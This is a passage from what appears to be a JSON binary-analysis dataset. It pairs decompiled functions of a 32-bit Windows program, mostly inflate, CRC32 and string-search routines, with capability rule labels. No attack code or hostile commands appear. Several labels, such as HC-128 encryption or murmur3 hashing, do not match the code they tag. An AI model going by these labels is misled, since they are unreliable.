puVar3 = puVar3 + 1;\n                                arg_ch = arg_ch + -1;\n                            } while (arg_ch != 0);\n                        }\n                        goto code_r0x00405df2;\n                    }\n                    if ((uVar1 & 0x40) != 0) break;\n                    puVar4 = puVar4 + ((*(arg_8h * 4 + 0x43c510) & var_ch) + *(puVar4 + 4)) * 8;\n                    uVar1 = *puVar4;\n                    var_ch = var_ch >> (puVar4[1] & 0x1f);\n                    uVar8 = uVar8 - puVar4[1];\n                }\n                in_EDX[6] = \"invalid distance code\";\n                uVar5 = in_EDX[1] - var_8h;\n                if (uVar8 >> 3 < in_EDX[1] - var_8h) {\n                    uVar5 = uVar8 >> 3;\n                }\n                arg_8h = 0xfffffffd;\n            }\n            *(unaff_EDI + 0x20) = var_ch;\n            *(unaff_EDI + 0x1c) = uVar8 + uVar5 * -8;\n            in_EDX[1] = var_8h + uVar5;\n            puVar4 = *in_EDX;\n            *in_EDX = var_4h + -uVar5;\n            in_EDX[2] = in_EDX[2] + ((var_4h + -uVar5) - puVar4);\n            *(unaff_EDI + 0x34) = var_10h;\n            return arg_8h;\n        }\n        var_ch = var_ch >> (puVar4[1] & 0x1f);\n        uVar8 = uVar8 - puVar4[1];\n        *var_10h = puVar4[4];\n        var_10h = var_10h + 1;\n        var_14h = var_14h + -1;\ncode_r0x00405df2:\n        if ((var_14h < 0x102) || (var_8h < 0xa)) {\n            uVar5 = in_EDX[1] - var_8h;\n            if (uVar8 >> 3 < in_EDX[1] - var_8h) {\n                uVar5 = uVar8 >> 3;\n            }\n            *(unaff_EDI + 0x20) = var_ch;\n            *(unaff_EDI + 0x1c) = uVar8 + uVar5 * -8;\n            in_EDX[1] = var_8h + uVar5;\n            puVar4 = *in_EDX;\n            *in_EDX = var_4h + -uVar5;\n            in_EDX[2] = in_EDX[2] + ((var_4h + -uVar5) - puVar4);\n            *(unaff_EDI + 0x34) = var_10h;\n            return 0;\n        }\n    } while( true );\n    puVar4 = puVar4 + ((*(uVar6 * 4 + 0x43c510) & var_ch) + *(puVar4 + 4)) * 8;\n    uVar1 = *puVar4;\n    goto code_r0x00405c69;\n}\n",
        "token_count": 2568
    },
    "0041a703": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a703(int32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iStack36;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    var_8h = 0xffffffff;\n    uVar2 = *(in_EAX + 2);\n    iVar5 = 7;\n    iStack36 = 4;\n    if (uVar2 == 0) {\n        iVar5 = 0x8a;\n        iStack36 = 3;\n    }\n    *(in_EAX + 6 + in_ECX * 4) = 0xffff;\n    if (-1 < in_ECX) {\n        var_4h = in_EAX + 6;\n        var_ch = in_ECX + 1;\n        iVar6 = 0;\n        uVar3 = uVar2;\n        do {\n            uVar4 = *var_4h;\n            iVar6 = iVar6 + 1;\n            if ((iVar5 <= iVar6) || (uVar3 != uVar4)) {\n                if (iVar6 < iStack36) {\n                    piVar1 = arg_8h + 0xef4 + uVar3 * 4;\n                    *piVar1 = *piVar1 + iVar6;\n                }\n                else if (uVar3 == 0) {\n                    if (iVar6 < 0xb) {\n                        *(arg_8h + 0xf38) = *(arg_8h + 0xf38) + 1;\n                    }\n                    else {\n                        *(arg_8h + 0xf3c) = *(arg_8h + 0xf3c) + 1;\n                    }\n                }\n                else {\n                    if (uVar3 != var_8h) {\n                        piVar1 = arg_8h + 0xef4 + uVar3 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(arg_8h + 0xf34) = *(arg_8h + 0xf34) + 1;\n                }\n                iVar6 = 0;\n                var_8h = uVar3;\n                if (uVar4 == 0) {\n                    iVar5 = 0x8a;\n                }\n                else {\n                    if (uVar3 != uVar4) {\n                        iVar5 = 7;\n                        iStack36 = 4;\n                        goto code_r0x0041a7bd;\n                    }\n                    iStack36 = 6;\n                    iVar5 = iStack36;\n                }\n                iStack36 = 3;\n            }\ncode_r0x0041a7bd:\n            var_4h = var_4h + 2;\n            var_ch = var_ch + -1;\n            uVar3 = uVar4;\n        } while (var_ch != 0);\n    }\n    return;\n}\n",
        "token_count": 703
    },
    "0041a7cb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a7cb(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    iVar3 = 0;\n    iVar1 = 7;\n    var_4h = 4;\n    if (*(in_EAX + 2) == 0) {\n        iVar1 = 0x8a;\n        var_4h = 3;\n    }\n    if (-1 < param_2) {\n        var_8h = in_EAX + 6;\n        var_10h = param_2 + 1;\n        uVar4 = *(in_EAX + 2);\n        do {\n            uVar2 = *var_8h;\n            iVar3 = iVar3 + 1;\n            if ((iVar1 <= iVar3) || (uVar4 != uVar2)) {\n                if (iVar3 < var_4h) {\n                    do {\n                        fcn.0041ae0c(*(param_1 + 0xef6 + uVar4 * 4));\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n                else {\n                    if (uVar4 == 0) {\n                        if (iVar3 < 0xb) {\n                            fcn.0041ae0c(*(param_1 + 0xf3a));\n                            uVar5 = 3;\n                        }\n                        else {\n                            fcn.0041ae0c(*(param_1 + 0xf3e));\n                            uVar5 = 7;\n                        }\n                    }\n                    else {\n                        if (uVar4 != var_ch) {\n                            fcn.0041ae0c(*(param_1 + 0xef6 + uVar4 * 4));\n                        }\n                        fcn.0041ae0c(*(param_1 + 0xf36));\n                        uVar5 = 2;\n                    }\n                    fcn.0041ae0c(uVar5);\n                }\n                iVar3 = 0;\n                var_ch = uVar4;\n                if (uVar2 == 0) {\n                    iVar1 = 0x8a;\n                }\n                else {\n                    if (uVar4 != uVar2) {\n                        iVar1 = 7;\n                        var_4h = 4;\n                        goto code_r0x0041a8e6;\n                    }\n                    iVar1 = 6;\n                }\n                var_4h = 3;\n            }\ncode_r0x0041a8e6:\n            var_8h = var_8h + 2;\n            var_10h = var_10h + -1;\n            uVar4 = uVar2;\n        } while (var_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 676
    },
    "00404c82": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.00404c82(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = unaff_ESI[0xf];\n    }\n    if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {\n        (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[3]);\n    }\n    if (*unaff_ESI == 6) {\n        (**(unaff_EDI + 0x24))(*(unaff_EDI + 0x28), unaff_ESI[1]);\n    }\n    unaff_ESI[0xd] = unaff_ESI[10];\n    unaff_ESI[0xc] = unaff_ESI[10];\n    *unaff_ESI = 0;\n    unaff_ESI[7] = 0;\n    unaff_ESI[8] = 0;\n    if (unaff_ESI[0xe] != NULL) {\n        iVar1 = (*unaff_ESI[0xe])(0, 0, 0);\n        unaff_ESI[0xf] = iVar1;\n        *(unaff_EDI + 0x30) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "004080a6": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.004080a6(uchar *param_1)\n\n{\n    uchar *arg_8h;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    uint uStackY1092;\n    uint uStackY1088;\n    uint uStackY1084;\n    char *pcStackY1080;\n    uchar *puStackY1076;\n    uint uStackY1072;\n    uint uStackY1068;\n    uint uStackY1064;\n    uint uStackY1060;\n    uint uStackY1052;\n    uchar *puStackY1048;\n    uchar *puStack1032;\n    int32_t iStack1028;\n    uchar *puStack1024;\n    uint uVar2;\n    uint uStack1008;\n    uint uStack1004;\n    uint in_stack_fffffc18;\n    \n    uStack1008 = 0x48;\n    fcn.00420895();\n    *0x446674 = 1;\n    puStack1024 = 0x4080e8;\n    fcn.004257d0();\n    arg_8h = param_1;\n    if (in_stack_00000018 < 0x10) {\n        arg_8h = &stack0x00000004;\n    }\n    puStack1024 = 0x408115;\n    iStack1028 = fcn.0041ebdd(arg_8h, &stack0xfffffc00, &stack0xfffffbf8);\n    while (iStack1028 != 0) {\n        iVar1 = (**0x4463a4)();\n        if (5 < iVar1) {\n            (**0x4464ac)();\n            fcn.00416673();\n            iStack1028 = 0x40815b;\n            puStack1024 = &stack0xfffffc10;\n            (**0x4464ac)();\n            iStack1028 = *0x445e78;\n            puStack1032 = &stack0xfffffc10;\n            (**0x4464ac)();\n            fcn.0040d7e3();\n            puStackY1048 = &stack0xfffffbbc;\n            uStackY1052 = 0x408182;\n            fcn.004257d0();\n            uStackY1092 = 0x3c;\n            uStackY1088 = 0;\n            uStackY1084 = 0;\n            pcStackY1080 = \"open\";\n            uStackY1072 = 0x43bd76;\n            uStackY1068 = 0;\n            uStackY1064 = 5;\n            uStackY1060 = 0;\n            puStackY1076 = &stack0xfffffc10;\n            (**0x446510)();\n            puStack1024 = 0x4081c4;\n            fcn.004257d0();\n            puStack1024 = 0x3e8;\n            iStack1028 = 0;\n            puStack1032 = &stack0xfffffc10;\n            fcn.004257d0();\n            puStackY1048 = 0x4081dd;\n            iStack1028 = fcn.0041ebdd(0, &stack0xfffffc00, &stack0xfffffbf8);\n        }\n    }\n    *0x44667c = 1;\n    uVar2 = 0x408202;\n    fcn.00403f73();\n    *in_FS_OFFSET = uVar2;\n    uStack1004 = 0x40821d;\n    fcn.0041e0a1(in_stack_fffffc18);\n    return;\n}\n",
        "token_count": 798
    },
    "0040d955": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040d955(int32_t param_1, uint param_2, uint param_3, int32_t param_4, uint param_5, uint param_6, uint param_7\n                 )\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    uint uStackY8824;\n    uint uStackY8820;\n    uint uStackY8816;\n    uint uStackY8812;\n    uint uStackY8808;\n    uint uStackY8804;\n    uint uStackY8800;\n    int32_t iStackY8796;\n    int32_t iStackY8792;\n    int32_t iStackY8788;\n    uint uStackY8784;\n    int32_t iStackY8780;\n    uchar auStackY3776 [2000];\n    uchar auStackY1776 [756];\n    uchar auStackY1020 [500];\n    uchar auStackY520 [60];\n    uint uStackY460;\n    int32_t iStackY456;\n    uint uStackY452;\n    uchar *puStackY448;\n    uchar *puStackY444;\n    uint uStackY440;\n    int32_t iStackY436;\n    uchar *puStackY432;\n    int32_t iStackY428;\n    uchar *puVar5;\n    uint arg_8h;\n    \n    fcn.0042cc70();\n    iStackY8788 = param_1;\n    uStackY8816 = param_3;\n    iStackY8792 = param_4;\n    uStackY8820 = param_5;\n    uStackY8812 = param_6;\n    uStackY8800 = param_7;\n    uStackY8808 = *0x44626c;\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    (**0x446508)();\n    uStackY8784 = (**0x446490)();\n    fcn.004257d0();\n    iStackY8796 = (**0x4463e8)();\n    uStackY8804 = 120000;\n    (**0x4462dc)();\n    uStackY8824 = 0x100;\n    iStackY8780 = 0;\n    arg_8h = extraout_ECX;\n    iVar1 = (**0x4464dc)();\n    if (iVar1 == 0) {\n        iStackY8780 = 1;\n    }\n    if (iStackY8796 != 0) {\n        fcn.00416673();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n        iStackY8788 = (**0x446504)();\n        if ((iStackY8788 != 0) && (iStackY8780 = (**0x446548)(),  iStackY8780 != 0)) {\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4463a4)();\n            (**0x4463a4)();\n            iVar4 = 0;\n            (**0x446508)();\n            iVar1 = (**0x446490)();\n            uVar2 = (**0x4463a4)();\n            fcn.00420150(iVar1, &stack0xfffffdf8, uVar2);\n            puVar5 = &stack0xfffffdf8;\n            uVar2 = uStackY8816;\n            iVar3 = (**0x4463a4)();\n            fcn.00420150(iVar3 + iVar1, puVar5, uVar2);\n            (**0x4463a4)();\n            puVar5 = &stack0xfffffdf8;\n            uVar2 = uStackY8784;\n            iVar3 = (**0x4463a4)();\n            iStackY428 = 0x40deb7;\n            fcn.00420150(iVar3 + iStackY8792 + iVar1, puVar5, uVar2);\n            do {\n                iStackY428 = 0x40dec9;\n                iStackY428 = (**0x4463a4)();\n                puStackY432 = &stack0xfffffc04;\n                iStackY436 = iStackY8780;\n                uStackY440 = 0x40deda;\n                (**0x4464c8)();\n                uStackY440 = 0;\n                puStackY444 = &stack0xffffdd88;\n                puStackY448 = &stack0xfffff910;\n                uStackY452 = 0x13;\n                iStackY456 = iStackY8780;\n                uStackY460 = 0x40def2;\n                iVar1 = (**0x446560)();\n                if ((iVar1 != 0) && (iVar1 = (**0x4464dc)(),  iVar1 == 0)) break;\n                (**0x44631c)();\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 6);\n            while( true ) {\n                iStackY428 = iStackY8780;\n                puStackY432 = 0x40df59;\n                iVar1 = (**0x44640c)();\n                if ((iVar1 == 0) || (iStackY8792 == 0)) break;\n                (&stack0xfffff140)[iStackY8792] = 0;\n                (**0x4464ac)();\n            }\n        }\n    }\n    (**0x4463e4)();\n    (**0x4463e4)();\n    (**0x4463e4)();\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 1635
    },
    "0040d61b": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d61b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004208c8(8);\n    piVar1 = *(unaff_EBP + 8);\n    uVar6 = *(unaff_EBP + 0xc) | 7;\n    if (uVar6 < 0x7fffffff) {\n        *(unaff_EBP + -0x14) = piVar1[5];\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar6 / 3 < uVar2) && (uVar6 = uVar2 + piVar1[5],  0x7ffffffe - uVar2 < piVar1[5])) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    else {\n        uVar6 = *(unaff_EBP + 0xc);\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.0040d6fe();\n    *(unaff_EBP + 0xc) = uVar4;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar5 = piVar1;\n        if (7 < piVar1[5]) {\n            piVar5 = *piVar1;\n        }\n        fcn.00420150(*(unaff_EBP + 0xc), piVar5, *(unaff_EBP + 0x10) * 2);\n    }\n    fcn.0040c0f0(1);\n    piVar5 = *(unaff_EBP + 0xc);\n    iVar3 = *(unaff_EBP + 0x10);\n    *piVar1 = piVar5;\n    piVar1[5] = uVar6;\n    piVar1[4] = iVar3;\n    if (uVar6 < 8) {\n        piVar5 = piVar1;\n    }\n    *(piVar5 + iVar3 * 2) = 0;\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 581
    },
    "0041511c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041511c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    uint32_t extraout_ECX_00;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar5 = *unaff_ESI;\n    uVar3 = (unaff_ESI[1] - iVar5) / 0x1c;\n    if (0x9249248 < uVar3) {\n        fcn.0041d5a6(\"vector<T> too long\");\n        iVar5 = extraout_ECX;\n    }\n    if ((unaff_ESI[2] - iVar5) / 0x1c < uVar3 + 1) {\n        fcn.004208c8(8);\n        if (0x9249249 < extraout_ECX_00) {\n            fcn.0041d5a6(\"vector<T> too long\");\n        }\n        if ((extraout_EDX[2] - *extraout_EDX) / 0x1c < extraout_ECX_00) {\n            uVar4 = fcn.00415219();\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + -0x14) = uVar4;\n            fcn.00415595(extraout_EDX[1], *(unaff_EBP + -0x14));\n            iVar5 = *extraout_EDX;\n            iVar1 = extraout_EDX[1];\n            if (iVar5 != 0) {\n                fcn.0040d5fa(extraout_EDX[1]);\n                fcn.0041e801(*extraout_EDX);\n            }\n            iVar2 = *(unaff_EBP + -0x14);\n            extraout_EDX[2] = extraout_ECX_00 * 0x1c + iVar2;\n            extraout_EDX[1] = ((iVar1 - iVar5) / 0x1c) * 0x1c + iVar2;\n            *extraout_EDX = iVar2;\n        }\n        fcn.00420934();\n        return;\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "00405ef8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405ef8(uint8_t *param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == NULL) {\n        return 0;\n    }\n    uVar1 = ~in_EAX;\n    if (7 < param_2) {\n        uVar2 = param_2 >> 3;\n        do {\n            uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[1] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[2] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[3] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[4] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[5] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[6] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[7] ^ uVar1) & 0xff) * 4 + 0x43d898);\n            param_1 = param_1 + 8;\n            param_2 = param_2 - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; param_2 != 0; param_2 = param_2 - 1) {\n        uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x43d898);\n        param_1 = param_1 + 1;\n    }\n    return ~uVar1;\n}\n",
        "token_count": 562
    },
    "0041c18f": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041c18f(uint8_t *param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == NULL) {\n        return 0;\n    }\n    uVar1 = ~in_EAX;\n    if (7 < param_2) {\n        uVar2 = param_2 >> 3;\n        do {\n            uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[1] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[2] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[3] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[4] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[5] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[6] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[7] ^ uVar1) & 0xff) * 4 + 0x43bf68);\n            param_1 = param_1 + 8;\n            param_2 = param_2 - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; param_2 != 0; param_2 = param_2 - 1) {\n        uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x43bf68);\n        param_1 = param_1 + 1;\n    }\n    return ~uVar1;\n}\n",
        "token_count": 563
    },
    "0041bff5": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041bff5(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    uVar1 = arg_8h >> 8;\n    fcn.0041c68b(&var_1h, 1);\n    arg_8h = arg_8h & 0xffffff | arg_8h << 0x18;\n    fcn.0041c68b(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | uVar1 << 0x18;\n    fcn.0041c68b(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | arg_ch << 0x18;\n    fcn.0041c68b(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (arg_ch >> 8) << 0x18;\n    fcn.0041c68b(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (arg_ch >> 0x10) << 0x18;\n    fcn.0041c68b(&arg_8h + 3, 1);\n    arg_8h = arg_ch & 0xff000000 | arg_8h & 0xffffff;\n    fcn.0041c68b(&arg_8h + 3, 1);\n    arg_ch = arg_ch & 0xffffff | in_EAX << 0x18;\n    fcn.0041c68b(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (in_EAX >> 8) << 0x18;\n    fcn.0041c68b(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (in_EAX >> 0x10) << 0x18;\n    fcn.0041c68b(&arg_ch + 3, 1);\n    arg_ch = in_EAX & 0xff000000 | arg_ch & 0xffffff;\n    fcn.0041c68b(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff;\n    fcn.0041c68b(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff;\n    fcn.0041c68b(&arg_ch + 3, 1);\n    return 0;\n}\n",
        "token_count": 781
    },
    "004258d0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.004258d0(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar8 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar8 ^ 0xffffffff ^ uVar8 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar9 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar9[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar9[2]) break;\n            pcVar1 = pcVar9 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar9 = pcVar9 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 923
    },
    "0041c3aa": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c3aa(uint arg_8h)\n\n{\n    uint16_t *unaff_ESI;\n    uint16_t *unaff_EDI;\n    uint *arg_8h_00;\n    uint var_14h;\n    uint var_eh;\n    uint16_t var_ah;\n    int16_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    arg_8h_00 = &arg_8h;\n    (**0x446540)(arg_8h_00, &var_14h);\n    *unaff_ESI = ((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f;\n    *unaff_EDI = (var_ah & 0x3f | CONCAT22(var_ah, var_eh._2_2_) << 6) << 5 | var_8h * 2 & 0x1fU;\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 293
    },
    "0042ded6": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
